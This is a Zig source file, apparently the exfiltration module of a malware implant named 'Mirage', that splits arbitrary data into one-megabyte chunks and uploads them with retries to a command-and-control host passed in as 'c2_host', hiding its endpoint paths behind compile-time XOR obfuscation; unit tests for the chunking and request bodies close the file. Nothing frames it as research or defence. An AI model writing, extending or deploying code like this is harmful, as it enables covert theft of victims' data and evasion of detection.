const std = @import("std");
const http = @import("http.zig");
const hash = @import("../types/hash.zig");

const CHUNK_SIZE: usize = 1024 * 1024;
const MAX_RETRIES: u32 = 3;

const encrypted_chunk_path = comptime hash.xorEncrypt("/api/log/chunk");
const encrypted_complete_path = comptime hash.xorEncrypt("/api/log/complete");

pub const ChunkResult = enum(u32) {
    complete = 0,
    partial = 1,
    failed = 2,
};

fn generateSessionId(allocator: std.mem.Allocator) ![]u8 {
    var rng = std.Random.DefaultPrng.init(blk: {
        var seed: u64 = undefined;
        std.posix.getrandom(@as([*]u8, @ptrCast(&seed))[0..@sizeOf(u64)]) catch {
            seed = @bitCast(@as(i64, @truncate(std.time.nanoTimestamp())));
        };
        break :blk seed;
    });
    var buf: [16]u8 = undefined;
    rng.fill(&buf);
    const hex = try std.fmt.bufPrint(&std.mem.zeroes([32]u8), "{s}", .{std.fmt.fmtSliceHexLower(&buf)});
    return allocator.dupe(u8, hex);
}

fn buildChunkBody(
    allocator: std.mem.Allocator,
    boundary: []const u8,
    session_id: []const u8,
    chunk_index: usize,
    chunk_data: []const u8,
) ![]u8 {
    var body = try std.ArrayList(u8).initCapacity(allocator, 4096);
    errdefer body.deinit(allocator);

    const add_field = struct {
        fn append(out: *std.ArrayList(u8), a: []const u8) !void {
            try out.appendSlice(a);
        }
    }.append;

    try add_field(&body, "--");
    try add_field(&body, boundary);
    try add_field(&body, "\r\nContent-Disposition: form-data; name=\"session_id\"\r\n\r\n");
    try add_field(&body, session_id);
    try add_field(&body, "\r\n");

    try add_field(&body, "--");
    try add_field(&body, boundary);
    try add_field(&body, "\r\nContent-Disposition: form-data; name=\"chunk_index\"\r\n\r\n");
    {
        var idx_buf: [16]u8 = undefined;
        const idx_str = try std.fmt.bufPrint(&idx_buf, "{d}", .{chunk_index});
        try add_field(&body, idx_str);
    }
    try add_field(&body, "\r\n");

    try add_field(&body, "--");
    try add_field(&body, boundary);
    try add_field(&body, "\r\nContent-Disposition: form-data; name=\"data\"; filename=\"chunk.bin\"\r\n");
    try add_field(&body, "Content-Type: application/octet-stream\r\n\r\n");
    try add_field(&body, chunk_data);
    try add_field(&body, "\r\n");

    try add_field(&body, "--");
    try add_field(&body, boundary);
    try add_field(&body, "--\r\n");

    return body.toOwnedSlice(allocator);
}

fn buildCompleteBody(
    allocator: std.mem.Allocator,
    boundary: []const u8,
    session_id: []const u8,
    total_chunks: usize,
    metadata: []const u8,
) ![]u8 {
    var body = try std.ArrayList(u8).initCapacity(allocator, 2048);
    errdefer body.deinit(allocator);

    const add = struct {
        fn append(out: *std.ArrayList(u8), a: []const u8) !void {
            try out.appendSlice(a);
        }
    }.append;

    try add(&body, "--");
    try add(&body, boundary);
    try add(&body, "\r\nContent-Disposition: form-data; name=\"session_id\"\r\n\r\n");
    try add(&body, session_id);
    try add(&body, "\r\n");

    try add(&body, "--");
    try add(&body, boundary);
    try add(&body, "\r\nContent-Disposition: form-data; name=\"total_chunks\"\r\n\r\n");
    {
        var tc_buf: [16]u8 = undefined;
        const tc_str = try std.fmt.bufPrint(&tc_buf, "{d}", .{total_chunks});
        try add(&body, tc_str);
    }
    try add(&body, "\r\n");

    try add(&body, "--");
    try add(&body, boundary);
    try add(&body, "\r\nContent-Disposition: form-data; name=\"metadata\"\r\n\r\n");
    try add(&body, metadata);
    try add(&body, "\r\n");

    try add(&body, "--");
    try add(&body, boundary);
    try add(&body, "--\r\n");

    return body.toOwnedSlice(allocator);
}

pub fn uploadChunked(
    allocator: std.mem.Allocator,
    c2_host: []const u8,
    c2_port: u16,
    token: []const u8,
    data: []const u8,
    metadata: []const u8,
) ChunkResult {
    const session_id = generateSessionId(allocator) catch return .failed;
    defer allocator.free(session_id);

    const total_chunks = (data.len + CHUNK_SIZE - 1) / CHUNK_SIZE;

    var chunk_path_buf: [64]u8 = undefined;
    hash.xorDecrypt(&encrypted_chunk_path, &chunk_path_buf);
    const chunk_path = chunk_path_buf[0..encrypted_chunk_path.len];

    var complete_path_buf: [64]u8 = undefined;
    hash.xorDecrypt(&encrypted_complete_path, &complete_path_buf);
    const complete_path = complete_path_buf[0..encrypted_complete_path.len];

    var chunk_index: usize = 0;
    while (chunk_index < total_chunks) : (chunk_index += 1) {
        const start = chunk_index * CHUNK_SIZE;
        const end = @min(start + CHUNK_SIZE, data.len);
        const chunk_data = data[start..end];

        const boundary = "----MirageChunkBoundary7XkR9fL2";
        const body = buildChunkBody(allocator, boundary, session_id, chunk_index, chunk_data) catch return .failed;
        defer allocator.free(body);

        var auth_header_buf: [512]u8 = undefined;
        const auth_header = std.fmt.bufPrint(&auth_header_buf, "Bearer {s}", .{token}) catch return .failed;

        var attempt: u32 = 0;
        var uploaded = false;
        while (attempt < MAX_RETRIES and !uploaded) : (attempt += 1) {
            var client = http.HttpClient.connect(c2_host, c2_port) catch continue;
            defer client.close();

            const headers = [_]http.Header{
                .{ .name = "Authorization", .value = auth_header },
            };

            const resp = client.postMultipart(chunk_path, &headers, boundary, body) catch continue;
            defer resp.deinit();

            if (resp.status == 200) uploaded = true;
        }

        if (!uploaded) return .partial;
    }

    const complete_boundary = "----MirageCompleteBoundary1Yz8Wk3P";
    const complete_body = buildCompleteBody(allocator, complete_boundary, session_id, total_chunks, metadata) catch return .failed;
    defer allocator.free(complete_body);

    var auth_header_buf: [512]u8 = undefined;
    const auth_header = std.fmt.bufPrint(&auth_header_buf, "Bearer {s}", .{token}) catch return .failed;

    var complete_attempt: u32 = 0;
    while (complete_attempt < MAX_RETRIES) : (complete_attempt += 1) {
        var client = http.HttpClient.connect(c2_host, c2_port) catch continue;
        defer client.close();

        const headers = [_]http.Header{
            .{ .name = "Authorization", .value = auth_header },
        };

        const resp = client.postMultipart(complete_path, &headers, complete_boundary, complete_body) catch continue;
        defer resp.deinit();

        if (resp.status == 200) return .complete;
    }

    return .partial;
}

test "chunked upload splits correctly" {
    const allocator = std.testing.allocator;

    const data = try allocator.alloc(u8, CHUNK_SIZE * 3 + 123);
    defer allocator.free(data);
    @memset(data, 0x41);

    const expected_chunks = 4;
    const total = (data.len + CHUNK_SIZE - 1) / CHUNK_SIZE;
    try std.testing.expectEqual(@as(usize, expected_chunks), total);

    var c: usize = 0;
    var offset: usize = 0;
    while (offset < data.len) : (offset += CHUNK_SIZE) {
        c += 1;
        const end = @min(offset + CHUNK_SIZE, data.len);
        const slice = data[offset..end];
        try std.testing.expect(slice.len > 0);
    }
    try std.testing.expectEqual(@as(usize, expected_chunks), c);
}

test "chunked session id generation" {
    const allocator = std.testing.allocator;
    const id = try generateSessionId(allocator);
    defer allocator.free(id);
    try std.testing.expect(id.len > 0);
}

test "chunked build chunk body format" {
    const allocator = std.testing.allocator;
    const body = try buildChunkBody(allocator, "----TestBoundary", "sess1", 0, "testdata");
    defer allocator.free(body);
    try std.testing.expect(body.len > 0);
    try std.testing.expect(std.mem.indexOf(u8, body, "session_id") != null);
    try std.testing.expect(std.mem.indexOf(u8, body, "chunk_index") != null);
    try std.testing.expect(std.mem.indexOf(u8, body, "testdata") != null);
}

test "chunked build complete body format" {
    const allocator = std.testing.allocator;
    const body = try buildCompleteBody(allocator, "----TestBoundary", "sess1", 4, "test_meta");
    defer allocator.free(body);
    try std.testing.expect(body.len > 0);
    try std.testing.expect(std.mem.indexOf(u8, body, "total_chunks") != null);
    try std.testing.expect(std.mem.indexOf(u8, body, "test_meta") != null);
}

test "chunked encrypted paths non-empty" {
    try std.testing.expect(encrypted_chunk_path.len > 0);
    try std.testing.expect(encrypted_complete_path.len > 0);
    try std.testing.expect(encrypted_chunk_path.len < encrypted_complete_path.len);
}
